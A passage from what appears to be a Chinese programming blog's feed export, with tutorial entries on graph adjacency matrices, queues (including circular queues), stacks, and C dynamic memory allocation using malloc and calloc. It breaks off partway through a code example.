2个相邻的点,就是邻接.</p><p>邻接矩阵是一种用于表示图的数据结构.实际上就是个二维数组—是个<code>方阵</code>.</p><p>在邻接矩阵中,行和列都对应图的顶点,如果两个顶点之间存在一条<code>弧</code>,那么对应的矩阵元素就是1（或者是边的权重,对于带权图）,否则就是0.</p><p>矩阵的<code>行</code>和<code>列</code>分别代表一条边的<code>起点</code>和<code>终点</code>,即第<code>i</code>行第<code>j</code>列的元素,代表顶点<code>i</code>到顶点<code>j</code>是否有一条边.</p><p>此外,对于无向图,由于边是双向的,所以第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>行第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>列的元素和第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>行第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>列的元素是相同的(在该方阵中关于主对角线对称),都表示顶点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>和顶点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>之间是否存在边.</p><p>但对于有向图,行和列的意义就有所不同了.如果我们有一条从顶点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>指向顶点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>的边,那么在邻接矩阵中,第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>行第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>列的元素会是1（或者是边的权重,对于带权图）,而第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>行第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>列的元素会是0,除非还存在一条从顶点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>指向顶点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>的边.</p><br><p>例如,对于以下图,我们可以创建相应的邻接矩阵：</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231229213940793.png" alt="image-20231229213940793" style="zoom:50%;" /><p>对应的邻接矩阵为：</p><table><thead><tr><th></th><th>A</th><th>B</th><th>C</th><th>D</th></tr></thead><tbody><tr><td>A</td><td>0</td><td>3</td><td>1</td><td>0</td></tr><tr><td>B</td><td>0</td><td>0</td><td>4</td><td>0</td></tr><tr><td>C</td><td>0</td><td>0</td><td>0</td><td>2</td></tr><tr><td>D</td><td>0</td><td>0</td><td>0</td><td>0</td></tr></tbody></table><h1 id="优缺点">优缺点</h1><p>优点:</p><ol><li><p>简单明了</p><p>邻接矩阵的数据结构非常简单,易于理解和实现.</p></li><li><p>方便查询</p><p>通过邻接矩阵,我们可以在常数时间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>内确定两个顶点之间是否存在边,或者边的权重是多少.</p></li></ol><p>缺点:</p><ol><li><p>空间消耗大</p><p>邻接矩阵的空间复杂度为<code>O(n^2)</code>,其中<code>n</code>为顶点数.因此,对于顶点数非常多,但边数相对较少的<code>稀疏图</code>来说,邻接矩阵可能会浪费大量的空间.</p></li></ol><p>因此,邻接矩阵更适合表示边数相对较多的稠密图.</p><h1 id="代码实现">代码实现</h1><p>可以很容易地使用二维数组来实现它.对于无权图,使用0和1来表示边的存在与否；对于带权图,使用特殊值（例如最大的整数）来表示边的不存在.</p><h2 id="图的属性">图的属性</h2><ol><li>顶点数</li><li>边数</li><li>无穷大的定义</li><li>是否带权重</li></ol><h2 id="图的操作">图的操作</h2><ol><li>创建/销毁一个图实例</li><li>插入一条(有向)边</li><li>删除一条(有向)边</li><li>查找从<code>u</code>到<code>v</code>是否有边,有的话返回其权重(无权图返回1)</li><li>按照起点,打印这个图</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>队列</title>
      <link href="/2024685514233b15/"/>
      <url>/2024685514233b15/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>队列(queue)可以认为是一种特殊的线性表,因为他仍然满足线性表的特点:</p><ul><li>存在一个唯一的没有前驱的(头)数据元素.(注意与具体实现中的&quot;头结点&quot;有别)</li><li>存在一个唯一的没有后继的(尾)数据元素.</li><li>除此之外,其他每一个数据元素均有一个直接前驱和一个直接后继数据元素.</li></ul><p>如前所述,链表和顺序表可以在表中的任何位置操作数据;栈只能在栈顶操作数据.</p><p>队列的操作则是:只允许在表的头部和尾部操作数据,并且表(队)头只能<code>弹出</code>元素(出队),表(队)尾只能<code>插入</code>元素(入队).当然,可以获取队头的元素值.</p><br><p>数据结构上的队列和日常生活中的排队是一致的,要遵循&quot;先来后到&quot;的原则,也就是满足了所谓的<code>FIFO</code>原则.</p><p>另外,和现实生活不同,队列中的元素(不是队头)一般是不允许进行插入(现实生活当然也不能插队doge)和删除(现实生活可以取消排队自行离开)的.因为我们只能操作队头和队尾.</p><h1 id="队列的实现">队列的实现</h1><h2 id="基于数组-顺序表">基于数组(顺序表)</h2><p>假设我们的队列有如下信息:----<code>属性</code></p><ul><li>front指针: 指示队头位置</li><li>tail/rear指针: 指示队尾</li><li>size值: 队列当前的元素个数</li><li>max_size值: 队列的最大容量—<code>循环队列</code>需要—使用数组(realloc),而链栈(一般)则不需要</li></ul><p>其中,<code>tail不指向任何有效元素</code>,我们稍后将会讲解为何需要这样做!</p><h3 id="队列的状态">队列的状态</h3><p>有如下3种状态:</p><h4 id="队列空">队列空</h4><p>由于tail不指向任何有效元素,front永远指向队头元素(除非队空),那么显然可以(和栈类似)指定:</p><p>队列为空,等价于<code>front==tail</code></p><h4 id="队列非空">队列非空</h4><p>与队列空互斥,则有:</p><p>队列非空,等价于<code>front!=tail</code></p><h4 id="队列满">队列满</h4><p>仅适用于数组实现(循环)队列,由于数组有长度上限,因此队列会满!</p><p>队列满,等价于<code>size==max_size</code> (初步考虑)</p><p>关于max_size如何定义需要另外讨论.</p><h3 id="指针的指向问题">指针的指向问题</h3><p>我们使用front指针来指向队头元素;用tail指向队尾元素的下一个空间.</p><p>这样设计tail指针的指向,是为了避免<code>假溢出</code>问题,同时解决判断队列状态的歧义问题.</p><h3 id="假溢出问题">假溢出问题</h3><p>由于数组的长度固定,如果简单地在末尾插入,在头部删除,整个队列就会在数组中逐渐向后&quot;平移&quot;,前面的元素空间都会被浪费掉,直到到达数组末尾,导致无法插入元素,即发生了溢出,但是此时前面的很多元素空间很可能都是空的!</p><p>假溢出的情况发生图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240308214006859.png" alt="image-20240308214006859" style="zoom:50%;" /><p>这种溢出叫做<code>假溢出</code>,即队列无法插入任何元素,但是实际上仍然有空间可用!</p><p>为了解决这个问题,我们需要想办法让队列在到达数组末尾时,新入队的元素能够存储到数组开头被出队的空间中,从整个数组来看,就像是一个圆圈,这样的实现称为<code>循环队列</code>.循环队列是从存储实现方式上看的,但是从队列ADT的角度来看,整个队列仍然只能从队头出队,从队尾入队.</p><p>循环队列的入队逻辑图如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240308134858929.png" alt="image-20240308134858929" style="zoom:50%;" /><p>你可能有点懵,那么不妨把数组当成一条&quot;蛇&quot;,把他拧成一个圆圈再看看呢?</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240308140746679.png" alt="image-20240308140746679" style="zoom:50%;" /><p>也就是说,通过某种手段,让tail在递增时,如果发生越界,则让他回到0的位置,继续递增.</p><h3 id="队列的状态判定">队列的状态判定</h3><h4 id="队空和队列有一个元素">队空和队列有一个元素</h4><p>前面说了,该实现中,用tail指向队尾元素的下一个空间,这是为了防止状态判断发生歧义.</p><p>想一下,如果我们让tail指向队尾元素:</p><p>假设有2个队列a,b.其中a有1个元素,b为空,那么队列的图示如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240308141900284.png" alt="image-20240308141900284" style="zoom:50%;" /><p>显然这2种状态如果使用指针来判断是否为空就会发生歧义-&gt;不好</p><p>当然也有解决方案—我们直接用size和max_size来判断是否为空即可.</p><br><p>不过设计程序的一个原则就是:尽可能避免各种潜在的歧义.</p><p>从这个角度去考虑,这里选择将tail的指针后移,这样就能区分出2种状态了:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240308142159345.png" alt="image-20240308142159345" style="zoom:50%;" /><h4 id="队满的判定">队满的判定</h4><p>同样,既然选择&quot;用tail指向队尾元素的下一个空间&quot;,那么避免&quot;队空&quot;和&quot;队满&quot;的歧义,我们需要人为地&quot;浪费&quot;一个空间,即front指针的前一个位置.</p><p>假设有2个队列a,b.其中a为空,b为满:</p><p>这是不浪费的情况:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240308142718861.png" alt="image-20240308142718861" style="zoom:50%;" /><p>这是人为浪费一个空间的情况:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240308142949393.png" alt="image-20240308142949393" style="zoom:50%;" /><p>显然后者无歧义.</p><br><p>至于&quot;让tail指向队尾元素&quot;的实现,也是可以的,这里使用&quot;让tail指向队尾元素的下一个空间&quot;的实现.</p><h3 id="队列的操作">队列的操作</h3><h4 id="入队-push">入队-push</h4><p>先判断队列是否已满.</p><p>由于tail指向当前队尾元素的下一个位置,所以直接复制元素进去,然后将tail递增即可,注意考虑回绕.</p><p>注意<code>size++</code>.</p><h4 id="出队-pop">出队-pop</h4><p>先判断队列是否为空.</p><p>(可能)需要将队首元素值备份并返回,然后直接将front递增即可,注意同样要考虑回绕.</p><p>注意<code>size--</code>.</p><h4 id="销毁队列-destory">销毁队列-destory</h4><p>(可能)将存储表的数组free掉.</p><p>然后将队列的实例销毁.</p><h4 id="获取状态信息">获取状态信息</h4><p>这些方法都只需要返回对应的状态信息即可,例如队列当前的元素个数<code>get_size()</code>,当前队头元素值<code>get_front()</code>.</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈</title>
      <link href="/202493287487d0a5/"/>
      <url>/202493287487d0a5/</url>
      
        <content type="html"><![CDATA[<h1 id="栈概述">栈概述</h1><p>栈(stack)可以认为是一种特殊的线性表,因为他仍然满足线性表的特点:</p><ul><li>存在一个唯一的没有前驱的(头)数据元素.(注意与具体实现中的&quot;头结点&quot;有别)</li><li>存在一个唯一的没有后继的(尾)数据元素.</li><li>除此之外,其他每一个数据元素均有一个直接前驱和一个直接后继数据元素.</li></ul><p>下面这是2种线性表,即<code>顺序表</code>和<code>链表</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240306170538627.png" alt="image-20240306170538627" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240306165216730.png" alt="image-20240306165216730" style="zoom:50%;" /><p>这两种表允许在表中的任何位置操作,栈则不同,栈只允许在表的一端(称为栈顶)操作,而且一般只允许<code>插入</code>和<code>删除</code>这2种操作.</p><p>我们可以建立这样的栈的<code>逻辑结构</code>:</p><p>顺序栈</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240307141121499.png" alt="image-20240307141121499" style="zoom:50%;" /><p>所有的插入,删除操作均只能在top一端进行,基于这种操作限制,栈属于<code>FILO原则</code>,即<code>First In Last Out</code>.</p><p>我们可以将栈想象一个箱子,我们每次都只能放一个物品进去,并逐渐堆叠,最先放入的物品会被压在最下面,最新放入的物品将会在最上面.(所谓的压箱底)</p><p>想要拿出之前放入的物品,则必须先将后放入的所有的物品拿出来.另一方面,最新(即最后)放入的物品在最上面,取出时也是最先拿出;最早放入的物品在最下面,取出时则要最后拿出.</p><p>这样的特性则是<code>FILO</code>.</p><p>另外有<code>FIFO</code>原则,队列—两头操作.</p><h1 id="栈的状态">栈的状态</h1><p>作为一个栈ADT:</p><p>栈有3种状态:栈空,栈非空,栈满.</p><p>我们需要使用一些方法来判断当前栈的状态.</p><p>假设我们的栈有如下信息:----<code>属性</code></p><ul><li>top指针: 指示栈顶位置</li><li>bottom指针: 指示栈底</li><li>size值: 栈当前的元素个数</li><li>max_size值: 栈的最大容量—<code>顺序栈</code>需要—使用数组(realloc),而链栈(一般)则不需要</li></ul><h2 id="栈非空">栈非空</h2><p>如前所述,栈顶指针top永远指向当前栈中的第一个元素,bottom指示栈底.</p><p>我们可以让bottom指针不指向任何有效元素,那么如果栈非空,则top指向某个有效元素,bottom不指向任何元素,例如将其置为<code>NULL</code>(或者0).</p><p>那么栈非空,等价于<code>top!=bottom</code></p><h2 id="栈空">栈空</h2><p>与栈非空相反,栈空时,top显然无法指向任何有效元素,当然此时bottom仍然可以让它指向NULL.</p><p>容易想到,top等于bottom时,可以认为栈空.</p><p>那么栈空,等价于<code>top==bottom</code>//都指向NULL/0</p><h2 id="栈满">栈满</h2><p>该状态仅适用于<code>顺序栈</code>,即基于顺序表实现的栈,此时栈一般存储于栈区(与现在讨论的栈不同),它有空间限制,因此需要保证栈当前元素个数不超过最大容量.</p><p>那么栈满,等价于<code>size==max_size</code></p><h1 id="栈的操作">栈的操作</h1><h2 id="压栈-push">压栈-push</h2><p>就是所谓的向栈中插入元素.</p><p>向栈顶插入元素的操作,通常被形象地称为<code>压栈</code>/入栈.因为原来的元素被堆叠(压)在新元素的下面.</p><p>在一切操作之前,必须检查当前栈的状态—如果栈满,则不应该执行压栈.</p><p>由于栈顶永远指向当前栈顶的有效元素,并且当栈空时top指向NULL.</p><p>所以,我们应该先让top指针指向一个有效的内存空间,用于存储新元素,这个操作类似于<code>++top</code>.</p><p>然后,就可以把新元素的值赋值进去.</p><p>最后,将当前元素个数+1,即<code>++size</code>.</p><h2 id="出栈-pop">出栈-pop</h2><p>从栈顶弹出元素的操作,被称作<code>出栈</code>.</p><p>在一切操作之前,必须检查当前栈的状态—如果栈空,则不应该执行出栈.</p><p>检查无误后,则可以出栈,同样,top指向当前栈顶元素,将该元素从栈中移除,不过一般会将元素值返回,用于处理.</p><p>一般,先备份该值,然后将元素空间销毁(用于链栈),例如使用free()进行空间释放.</p><p>然后将top指针下移,下一个元素成为新的栈顶,或者弹出最后一个元素后,top指向NULL.</p><p>同样,需要<code>--size</code>.</p><p>最后,将元素值返回.</p><h2 id="销毁栈-destroy-free">销毁栈-destroy/free</h2><p><s>很简单,不断地出栈,直到栈空即可.</s></p><p>更新:由于是顺序栈,直接free掉数组即可(当然如果本来就是一次性分配整个结构体,而不是再次分配另一段内存,则这步也不需要).</p><p>最后,将栈的实例销毁.</p><h2 id="获取状态信息">获取状态信息</h2><p>这些方法都只需要返回对应的状态信息即可,例如栈当前的元素个数<code>get_size()</code>,当前栈顶元素值<code>get_top()</code>.</p><h1 id="堆栈">堆栈</h1><p>计算机的堆栈,就是栈,每一个元素的大小不同,因为每个元素都是一个函数栈帧.</p><p>递归—压栈.</p><p>计算机的堆区和栈区.</p><p>堆区和数据结构的堆 没有任何关系!没有任何鸡毛的关系. heap</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-15_1-动态内存分配</title>
      <link href="/20243aebb4efa9ab/"/>
      <url>/20243aebb4efa9ab/</url>
      
        <content type="html"><![CDATA[<h1 id="引入问题">引入问题</h1><p>举一个烂大街的例子:</p><p>现在我们要录入一些书籍信息,事先不知道有多少本书,直到程序运行时才知道.</p><p>那么我们该如何编写程序呢.</p><p>首先,很容易想到,我们需要一个数组来存储若干个学号;接着,为了存储若干个学号,我们可以声明一个固定大小数组来存储.</p><br><p>上面的方法在我们事先(敲代码时)就已经知道要输入的学号数量时十分有效,但是在这个问题中,我们并不知道学号数量,只能在运行时才能获知,此时直接声明一个固定大小的数组就不再是一个好的选择,因为很有可能实际输入的数量超过数组的长度,导致<code>溢出</code>.</p><p><code>溢出</code>是十分严重的问题,会导致程序错误地访问甚至修改不此时应该被访问的地方,轻则导致程序运行错误,重则程序崩溃,甚至破坏重要数据.</p><br><p>我们需要一种方法来让程序实现在运行时<code>动态</code>地分配内存的功能,这里即&quot;动态地分配一个指定大小的数组,这个大小只能在运行时获取&quot;.</p><p>这就是动态内存分配,事实上,我们在函数内直接定义的数组,它们的存储空间称为<code>栈区</code>,栈的大小(一般)都是固定的,即在函数调用时就已经确定,无法更改,因此大小有限;而使用接下来讲解的<code>动态内存分配</code>来分配的内存,则被存储在称为<code>堆区</code>的部分,这里的数据都是可以随时分配,随时释放的,也就避免了固定大小带来的问题.</p><p>另一方面,全局变量不同,它们是定义在<code>全局区</code>的,其大小也是固定的.</p><p><code>栈区</code>,<code>堆区</code>,<code>全局区</code>,<code>代码区</code>是内存的四个分区,有关内存四区的内容,读者可以自行查阅资料,我们这里先不急于展开.</p><h1 id="c语言的动态内存管理">C语言的动态内存管理</h1><p>所谓的<code>动态内存分配</code>,其实就是分配<code>堆内存</code>.</p><p>内存中专门有一个分区,称为<code>堆区</code>,这里的内存空间是允许各个程序在运行时随时进行<code>请求</code>,随时<code>分配</code>给程序的.当然,在程序使用完这块内存(取决于程序的逻辑),需要<code>释放</code>掉,即将这块内存还给堆区,以备下一次或其他程序请求分配.</p><h2 id="请求堆内存">请求堆内存</h2><p>C标准库提供了一套函数,即<code>alloc系函数</code>,用于内存管理,他们声明于<code>stdlib.h</code>头文件中,即<code>Standard library</code>,这个头文件包含了C语言最常用的一些系统函数的声明.</p><p>分配的内存会返回其首地址,用一个指针进行存储.</p><h3 id="malloc函数">malloc函数</h3><p>最常用的函数是<code>malloc函数</code>,函数名是<code>Memory allocation</code>的缩写,顾名思义,专门用于分配内存.</p><p>函数原型如下:</p><p><code>void* malloc( size_t size );</code></p><p>其中:</p><ul><li>返回值是一个<code>void*</code>类型的指针,指向成功的分配内存空间的首地址</li><li>参数是一个<code>size_t</code>类型的无符号整数,代表请求分配的内存大小,单位为字节.</li><li>如果函数调用失败,即内存未能成功分配(例如堆空间不足,但是这种情况实际很少出现),则返回<code>NULL</code>指针.</li><li>malloc函数返回的内存空间是<code>连续</code>的,完全可以看做一个特定长度的<code>数组</code>来使用.</li><li>malloc函数并不会对返回的内存进行初始化,这段内存中的任何值均应该视为垃圾值.</li></ul><p>注意:</p><ul><li>如果<code>size</code>参数为零,则malloc的行为是<code>由实现定义</code>的,例如可以返回一个空指针,或者返回一个非空指针,但不应对该指针解引用!并且应该将其传递给<code>free</code>函数以避免内存泄漏.</li></ul><p>例如,我们需要分配一个长为n的int数组,n由用户来输入,并在数组中存储1~n这些数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> <span class="comment">// 需要包含stdlib.h头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">    <span class="comment">// 输入一个n</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the array: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="comment">// 分配内存,由于malloc的参数是字节数,我们需要将n乘以sizeof(int)</span></span><br><span class="line">    <span class="comment">// 来计算出实际需要的总字节数</span></span><br><span class="line"><span class="type">int</span> *arr = (<span class="type">int</span> *)<span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="keyword">if</span>(arr == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// malloc调用失败,未能成功分配内存.(大部分情况下不会发生)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">arr[i] = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 打印数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">// 使用free函数释放内存,该函数无需内存的实际长度,因为堆内存的长度由操作系统来管理.</span></span><br><span class="line"><span class="built_in">free</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240327125544630.png" alt="image-20240327125544630" style="zoom: 80%;" /><p>这样便可以在运行时分配不同长度的数组,以提高灵活性和安全性.</p><p>上面的代码需要注意的是:</p><ul><li>我们需要的是int数组,而malloc返回的内存是单纯的字节数组,它取决于我们如何使用它,因此,这里我们将返回值<code>强制类型转换</code>为int*,赋值给arr指针.</li><li>使用后的内存需要free掉,否则会发生<code>内存泄漏</code>,该问题后面会讲解.</li></ul><h3 id="calloc函数">calloc函数</h3><p>使用malloc函数务必需要注意,它不会对分配的内存进行初始化,我们必须手动为其初始化:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *str = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">100</span>);</span><br><span class="line"><span class="built_in">memset</span>(str,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p><code>memset</code>函数用于将第一个参数指向的一段内存的每个字节用第二个参数指定的值进行&quot;填充&quot;,填充长度为第三个参数指定的字节数.</p><br><p><code>calloc</code>函数可以在分配内存的同时进行零初始化,函数原型如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">calloc</span><span class="params">( <span class="type">size_t</span> num, <span class="type">size_t</span> size )</span>;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li>num: 对象数目</li><li>size: 每个对象的大小</li></ul><p>calloc分配一个<code>num</code>和<code>size</code>大小的对象的数组,并且将分配的内存中所有字节初始化为<code>零</code>.</p><p>注意:</p><ul><li>若<code>size</code>为零,则行为是实现定义的.</li></ul><p>将刚才的代码用calloc重写一下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> <span class="comment">// 需要包含stdlib.h头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">    <span class="comment">// 输入一个n</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the array: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="comment">// 分配内存,由于malloc的参数是字节数,我们需要将n乘以sizeof(int)</span></span><br><span class="line">    <span class="comment">// 来计算出实际需要的总字节数</span></span><br><span class="line"><span class="type">int</span> *arr = (<span class="type">int</span> *)<span class="built_in">calloc</span>(n, <span class="keyword">sizeof</span>(<span 